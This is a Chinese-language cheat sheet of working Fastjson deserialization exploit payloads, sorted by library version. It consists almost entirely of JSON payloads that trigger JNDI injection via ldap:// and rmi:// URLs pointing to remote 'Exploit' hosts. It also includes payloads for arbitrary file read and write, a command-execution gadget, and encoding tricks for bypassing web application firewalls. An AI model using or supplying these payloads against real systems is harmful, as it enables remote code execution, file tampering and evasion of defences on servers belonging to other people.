### Fastjson 1.2.25-1.2.43



exp

条件需要开启autotype

加[{绕过

```java
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://localhost:1389/badNameClass", "autoCommit":true}
```



### Fastjson 1.2.25-1.2.45

条件需要开启autotype

45把之前问题修了，但是可以借助第三方组件绕过。

需要mybatis，且版本需为3.x.x系列<3.5.0的版本。

```java
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/badNameClass"}}
```



### Fastjson1.2.25-1.2.47通杀

借助缓存进行通杀，缓存在1.2.48被改为默认关闭

漏洞原理是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测

这里有两大版本范围：

- 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用
- 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用

poc:

```java
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://localhost:1389/badNameClass",
        "autoCommit":true
    }
}
```



### Fastjson1.2.5 <= 1.2.59

需要开启AutoType

```java
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```



### Fastjson1.2.5 <= 1.2.60

**无需开启 autoType：**

```shell
{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://10.10.20.166:1099/ExportObject"}

{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://10.10.20.166:1389/ExportObject"}
```



### Fastjson1.2.5 <= 1.2.61

```java
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploit","Object":"a"}
```







### Fastjson <1.2.62

- 需要开启AutoType；
- Fastjson <= 1.2.62；
- JNDI注入利用所受的JDK版本限制；
- 目标服务端需要存在xbean-reflect包；



```java
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1098/exploit"}

{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://localhost:1389/Exploit"}, "namespace":""}

```



### fastjson<=1.2.66



### 前提条件

- 开启AutoType；
- Fastjson <= 1.2.66；
- JNDI注入利用所受的JDK版本限制；
- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；
- br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；
- com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；



```java
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/Exploit"], "Realms":[""]}


{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}

{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}


{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}

{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1399/Calc"}}
```



适用于jdk11以上版本的写文件的payload：

```java
{
    "@type": "java.lang.AutoCloseable",
    "@type": "sun.rmi.server.MarshalOutputStream",
    "out": {
        "@type": "java.util.zip.InflaterOutputStream",
        "out": {
           "@type": "java.io.FileOutputStream",
           "file": "/tmp/asdasd",
           "append": true
        },
        "infl": {
           "input": {
               "array": "eJxLLE5JTCkGAAh5AnE=",
               "limit": 14
           }
        },
        "bufLen": "100"
    },
    "protocolVersion": 1
}
```





### fastjson<=1.2.67

### 前提条件

- 开启AutoType；
- Fastjson <= 1.2.67；
- JNDI注入利用所受的JDK版本限制；
- org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；
- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；

```json
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://localhost:1389/Exploit"], "tm": {"$ref":"$.tm"}}

{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://localhost:1389/Exploit","instance":{"$ref":"$.instance"}}

```







### fastjson<=1.2.68 

- Fastjson <= 1.2.68；
- 利用类必须是expectClass类的子类或实现类，并且不在黑名单中；



```java
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
{"@type":"com.caucho.config.types.ResourceRef","lookupName": "ldap://localhost:1389/Exploit", "value": {"$ref":"$.value"}}

```



无需开启AutoType，直接成功绕过CheckAutoType()的检测从而触发执行：

```json
{"@type":"java.lang.AutoCloseable","@type":"vul.VulAutoCloseable","cmd":"calc"}
```



读文件

```json
{"@type":"java.lang.AutoCloseable", "@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream", "tempPath":"C:/Windows/win.ini", "targetPath":"D:/wamp64/www/win.txt"}
```



写文件

```json
{
    "stream": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
        "targetPath": "D:/wamp64/www/hacked.txt",
        "tempPath": "D:/wamp64/www/test.txt"
    },
    "writer": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.esotericsoftware.kryo.io.Output",
        "buffer": "cHduZWQ=",
        "outputStream": {
            "$ref": "$.stream"
        },
        "position": 5
    },
    "close": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.sleepycat.bind.serial.SerialOutput",
        "out": {
            "$ref": "$.writer"
        }
    }
}
```



写文件

```java
{
    'stream':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'java.io.FileOutputStream',
        'file':'/tmp/nonexist',
        'append':false
    },
    'writer':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.apache.solr.common.util.FastOutputStream',
        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',
        'sink':
        {
            '$ref':'$.stream'
        },
        'start':38
    },
    'close':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.iq80.snappy.SnappyOutputStream',
        'out':
        {
            '$ref':'$.writer'
        }
    }
}
```



适用于jdk8/10的

```java
{
    '@type':"java.lang.AutoCloseable",
    '@type':'sun.rmi.server.MarshalOutputStream',
    'out':
    {
        '@type':'java.util.zip.InflaterOutputStream',
        'out':
        {
           '@type':'java.io.FileOutputStream',
           'file':'dst',
           'append':false
        },
        'infl':
        {
            'input':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=='
        },
        'bufLen':1048576
    },
    'protocolVersion':1
}
```



### fastjson未知版本

```java
{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}

{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
```

 





## bypasswaf

Fastjson默认会去除键、值外的空格、`\b`、`\n`、`\r`、`\f`等，同时还会自动将键与值进行unicode与十六进制解码。

```java
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}

{  "@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}

{/*s6*/"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}

{\n"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}

{"@type"\b:"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}

{"\u0040\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}  {"\x40\x74\x79\x70\x65":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}
```
